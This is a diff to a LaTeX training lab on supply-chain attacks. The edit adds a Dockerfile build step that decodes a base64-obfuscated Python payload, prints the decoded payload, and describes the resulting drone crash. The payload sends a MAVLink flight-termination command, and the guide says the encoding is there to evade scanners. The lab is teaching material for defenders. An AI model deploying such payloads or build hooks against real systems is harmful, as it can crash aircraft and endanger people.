@@ -224,12 +224,6 @@
 
     In the cybersecurity world, hackers don't always directly target their primary victims. Instead, they inject malicious code into software or updates during their development phase. Once installed by the end-users, this software is already compromised.
 
-    \textbf{Real-world examples include:}
-    \begin{itemize}
-        \item \textbf{SolarWinds (2020)} – attackers infiltrated software updates used by major companies and government agencies.
-        \item \textbf{Codecov (2021)} – attackers altered CI/CD pipeline scripts, compromising customer data.
-        \item \textbf{Multiple npm package compromises} – attackers planted malicious code within popular software libraries.
-    \end{itemize}
     \end{hintbox}
 
     \newpage
@@ -876,7 +870,7 @@
         \item Encoding strings or data in a way that is not immediately readable
     \end{itemize}
     \noindent
-    We are going to to use the latter method: encoding strings or data in a way that is not immediately readable.
+    We are going to to use the latter method: encoding strings or data in a way that is not scannable by automated tools.
     This will allow us to modify the code in a way that is not scannable by automated tools.
 
     \newpage
@@ -887,33 +881,145 @@
     For an even more stealthy approach, we are not going to modify the code directly, but rather inject our malicious code into the build pipeline. 
     This way, even if someone looks at the code, they will not see our malicious code directly. Instead, we will modify the build pipeline to execute our malicious code during the build process. \\
     \noindent
-    In our Use Case the "Build Pipeline" is simulated by the Dockerfile of the docker container. For this we will modify the Dockerfile of the \texttt{ground-control-station} container to execute our malicious code during the build process.
-    For this we will slightly alter the Dockerfile of the \texttt{ground-control-station} container like this:
+    In our use case, the "Build Pipeline" is simulated by the Dockerfile of the docker container. We will modify the Dockerfile of the \texttt{ground-control-station} container to execute our malicious code during the build process.
+    
+    \noindent
+    We will slightly alter the Dockerfile of the \texttt{ground-control-station} container like this:
     \begin{lstlisting}[language=bash, caption=Modifying the Dockerfile]
     # Open the Dockerfile in the ground-control-station directory
     nano /sourcecode/ground-control-station/Dockerfile
     \end{lstlisting}
+    
     \noindent
-    In the Dockerfile we will add a line to insert our malicious code into the build process:
+    In the Dockerfile, we will add a line to insert our malicious code into the build process. The malicious code is base64-encoded to avoid detection by simple text-based security scanners:
+    
     \begin{lstlisting}[language=bash, caption=Adding malicious code to the Dockerfile]
-    # Add this line to the Dockerfile
-    ...
+    [... previous Dockerfile content...]
     COPY ground-control-station/missions /missions
     COPY ground-control-station/init /init
     
-    RUN echo "ZnJvbSBweW1hdmxpbmsgaW1wb3J0IG1hdnV0aWwKaW1wb3J0IHRpbWUKCmRlZiBzZW5kX2ZsaWdodF90ZXJtaW5hdGlvbl9jb21tYW5kKG1hc3Rlcik6CiAgICAiIiJTZW5kIGZsaWdodCB0ZXJtaW5hdGlvbiBjb21tYW5kIHRvIGZvcmNlIHRoZSBkcm9uZSB0byBzaHV0IGRvd24gaW4gbWlkLWFpci4iIiIKICAgIG1hc3Rlci5tYXYuY29tbWFuZF9sb25nX3NlbmQoCiAgICAgICAgbWFzdGVyLnRhcmdldF9zeXN0ZW0sCiAgICAgICAgbWFzdGVyLnRhcmdldF9jb21wb25lbnQsCiAgICAgICAgbWF2dXRpbC5tYXZsaW5rLk1BVl9DTURfRE9fRkxJR0hUVEVSTUlOQVRJT04sCiAgICAgICAgMCwgICMgQ29uZmlybWF0aW9uCiAgICAgICAgMSwgICMgUGFyYW0xOiAxIHRvIGluaXRpYXRlIGZsaWdodCB0ZXJtaW5hdGlvbgogICAgICAgIDAsIDAsIDAsIDAsIDAsIDAgICMgT3RoZXIgcGFyYW1zIHVudXNlZAogICAgKQogICAgcHJpbnQoIkZsaWdodCB0ZXJtaW5hdGlvbiBjb21tYW5kIHNlbnQgLSBzaW11bGF0aW5nIGNyYXNoIikKCiMgQ29ubmVjdCB0byB0aGUgZHJvbmUKY29ubmVjdGlvbl9zdHJpbmcgPSAidWRwOjAuMC4wLjA6MTQ1NTAiCm1hc3RlciA9IG1hdnV0aWwubWF2bGlua19jb25uZWN0aW9uKGNvbm5lY3Rpb25fc3RyaW5nKQptYXN0ZXIud2FpdF9oZWFydGJlYXQoKQpwcmludCgiQ29ubmVjdGVkIHRvIGRyb25lIikKCiMgU2VuZCBmbGlnaHQgdGVybWluYXRpb24gY29tbWFuZCB0byBzaW11bGF0ZSBhIGNyYXNoCnNlbmRfZmxpZ2h0X3Rlcm1pbmF0aW9uX2NvbW1hbmQobWFzdGVyKQoKIyBTZW5kIHBlcmlvZGljIGhlYXJ0YmVhdHMgdG8ga2VlcCBNQVZMaW5rIGNvbm5lY3Rpb24gYWxpdmUKdHJ5OgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBtYXN0ZXIubWF2LmhlYXJ0YmVhdF9zZW5kKAogICAgICAgICAgICBtYXZ1dGlsLm1hdmxpbmsuTUFWX1RZUEVfUVVBRFJPVE9SLAogICAgICAgICAgICBtYXZ1dGlsLm1hdmxpbmsuTUFWX0FVVE9QSUxPVF9BUkRVUElMT1RNRUdBLAogICAgICAgICAgICAwLCAwLAogICAgICAgICAgICBtYXZ1dGlsLm1hdmxpbmsuTUFWX1NUQVRFX0FDVElWRQogICAgICAgICkKICAgICAgICB0aW1lLnNsZWVwKDEpCmV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgIHBhc3MK" | base64 -d > /return-to-land.py
-
+    # This line decodes and executes malicious Python code during build
+    RUN echo "ZnJvbSBweW1hdmxpbmsgaW1wb3J0IG1hdnV0aWwKaW1wb3J0IHRpbWUKCmRlZiBzZW5k X2ZsaWdodF90ZXJtaW5hdGlvbl9jb21tYW5kKG1hc3Rlcik6CiAgICAiIiJTZW5kIGZs aWdodCB0ZXJtaW5hdGlvbiBjb21tYW5kIHRvIGZvcmNlIHRoZSBkcm9uZSB0byBzaHV0 IGRvd24gaW4gbWlkLWFpci4iIiIKICAgIG1hc3Rlci5tYXYuY29tbWFuZF9sb25nX3Nl bmQoCiAgICAgICAgbWFzdGVyLnRhcmdldF9zeXN0ZW0sCiAgICAgICAgbWFzdGVyLnRh cmdldF9jb21wb25lbnQsCiAgICAgICAgbWF2dXRpbC5tYXZsaW5rLk1BVl9DTURfRE9f RkxJR0hUVEVSTUlOQVRJT04sCiAgICAgICAgMCwgICMgQ29uZmlybWF0aW9uCiAgICAg ICAgMSwgICMgUGFyYW0xOiAxIHRvIGluaXRpYXRlIGZsaWdodCB0ZXJtaW5hdGlvbgog ICAgICAgIDAsIDAsIDAsIDAsIDAsIDAgICMgT3RoZXIgcGFyYW1zIHVudXNlZAogICAg KQogICAgcHJpbnQoIkZsaWdodCB0ZXJtaW5hdGlvbiBjb21tYW5kIHNlbnQgLSBzaW11 bGF0aW5nIGNyYXNoIikKCiMgQ29ubmVjdCB0aGUgZHJvbmUKY29ubmVjdGlvbl9z dHJpbmcgPSAidWRwOjAuMC4wLjA6MTQ1NTAiCm1hc3RlciA9IG1hdnV0aWwubWF2bGlu a19jb25uZWN0aW9uKGNvbm5lY3Rpb25fc3RyaW5nKQptYXN0ZXIud2FpdF9oZWFydGJl YXQoKQpwcmludCgiQ29ubmVjdGVkIHRvIGRyb25lIikKCiMgU2VuZCBmbGlnaHQgdGVy bWluYXRpb24gY29tbWFuZCB0byBzaW11bGF0ZSBhIGNyYXNoCnNlbmRfZmxpZ2h0X3Rl cm1pbmF0aW9uX2NvbW1hbmQobWFzdGVyKQoKIyBTZW5kIHBlcmlvZGljIGhlYXJ0YmVh dHMgdG8ga2VlcCBNQVZMaW5rIGNvbm5lY3Rpb24gYWxpdmUKdHJ5OgogICAgd2hpbGUg VHJ1ZToKICAgICAgICBt YXN0ZXIubWF2LmhlYXJ0YmVhdF9zZW5kKAogICAgICAgICA gICBtYXZ1dGlsLm1hdmxpbmsuTUFWX1RZUEVfUVVBRFJPVE9SLAogICAgICAgICAgICB tYXZ1dGlsLm1hdmxpbmsuTUFWX0FVVE9QSUxPVF9BUkRVUElMT1RNRUdBLAogICAgICA gICAgICAwLCAwLAogICAgICAgICAgICBtYXZ1dGlsLm1hdmxpbmsuTUFWX1NUQVRFX0F DVElWRQogICAgICAgICkKICAgICAgICB0aW1lLnNsZWVwKDEpCmV4Y2VwdCBLZXlib2 FyZEludGVycnVwdDoKICAgIHBhc3MK" | base64 -d > /return-to-land.py
+    
     RUN chmod +x /init
 
     CMD echo "Ground Control Online..." && /usr/bin/expect /init
     \end{lstlisting}
+    
+    \begin{hintbox}
+    \textbf{What does this malicious code do?}
+    
+    When decoded, the base64 string contains Python code that:
+    \begin{itemize}
+        \item Connects to the drone via MAVLink protocol
+        \item Sends a \texttt{MAV\_CMD\_DO\_FLIGHTTERMINATION} command
+        \item Forces the drone to shut down mid-flight, simulating a crash
+        \item Maintains connection to avoid suspicion
+    \end{itemize}
+    \end{hintbox}
+
+    \subsection{The Decoded Malicious Payload}
+
     \noindent
+    When the base64 string is decoded, it creates the following malicious Python file:
+
+    \begin{lstlisting}[language=python, caption=Decoded malicious return-to-land.py]
+    from pymavlink import mavutil
+    import time
+
+    def send_flight_termination_command(master):
+        """Send flight termination command to force the drone to shut down in mid-air."""
+        master.mav.command_long_send(
+            master.target_system,
+            master.target_component,
+            mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION,
+            0,  # Confirmation
+            1,  # Param1: 1 to initiate flight termination
+            0, 0, 0, 0, 0, 0  # Other params unused
+        )
+        print("Flight termination command sent - simulating crash")
+
+    # Connect to the drone
+    connection_string = "udp:0.0.0.0:14550"
+    master = mavutil.mavlink_connection(connection_string)
+    master.wait_heartbeat()
+    print("Connected to drone")
+
+    # Send flight termination command to simulate a crash
+    send_flight_termination_command(master)
+
+    # Send periodic heartbeats to keep MAVLink connection alive
+    try:
+        while True:
+            master.mav.heartbeat_send(
+                mavutil.mavlink.MAV_TYPE_QUADROTOR,
+                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
+                0, 0,
+                mavutil.mavlink.MAV_STATE_ACTIVE
+            )
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
+    \end{lstlisting}
+
     \newpage
 
+    \section{Conclusion}
     \noindent
-    In this document, we have explored various aspects of supply chain attacks, including their definition, potential impact, and methods of execution. We have also discussed defensive strategies that can be employed to mitigate these risks, such as static code analysis and code obfuscation.
+    Shortly after modifying the Dockerfile the scheduled cron job will execute the build-update script, which will in turn build the Docker image for the ground control station.
+
+    \begin{figure}[htbp]
+        \centering
+        \includegraphics[width=1.0\textwidth]{restart.png}
+        \caption{Restart of the ground control station container}
+    \end{figure}
 
     \noindent
-    By understanding the tactics used by attackers and implementing robust security measures, organizations can better protect themselves against supply chain threats.
+    After the build is complete, the ground control station will be restarted and our malicious code will be executed during the "return to home" stage of the drone flight. This will cause the drone to crash mid-flight. \\
+    \\
+    \noindent
+    You can now go back to the web interface of the drone and start a new flight:
 
-    \end{document}
+    \begin{figure}[htbp]
+        \centering
+        \includegraphics[width=1.0\textwidth]{crash.png}
+        \caption{Crash of the drone during return to home}
+    \end{figure}
+
+    \noindent
+    As you can see the first 3 stages of the flight are successful, but during the "return to home" stage, the drone crashes due to the malicious payload. \\
+    \\
+    \noindent
+    The drone will not return to the home position, but instead crash mid-flight but will suddenly turn off all motors and fall to the ground. The forth stage never coming to a close as the drone does not reach its home again.
+
+    \newpage
+
+    \section{Closing remarks}
+
+    \noindent
+    In this lab, we explored how an attacker can exploit vulnerabilities in a software supply chain to compromise a drone system. We learned how to:
+    \begin{itemize}
+        \item Use Docker 
+        \item Explore a simulated drone environment
+        \item Conduct reconnaissance to find vulnerabilities
+        \item Exploit cronjobs to escalate privileges
+        \item Modify build processes to inject malicious code
+    \end{itemize}
+
+    \noindent
+
+    \subsection{MITRE ATT\&CK Tactics and Techniques}
+    \noindent
+    This lab exercise aligns with the following MITRE ATT\&CK tactics and techniques:
+    \begin{itemize}
+        \item \textbf{Initial Access:} Phishing (T1566)
+        \item \textbf{Execution:} Command and Scripting Interpreter (T1059)
+        \item \textbf{Persistence:} Cron (T1053)
+        \item \textbf{Privilege Escalation:} Exploitation for Privilege Escalation (T1068)
+        \item \textbf{Defense Evasion:} Obfuscated Files or Information (T1027)
+        \item \textbf{Impact:} Denial of Service (T1499)
+    \end{itemize}
+    \noindent
+    Understanding these tactics and techniques helps us recognize how attackers operate and how to defend against such attacks.
+    You can look them up in the MITRE ATT\&CK framework: \url{https://attack.mitre.org/}
+\end{document}
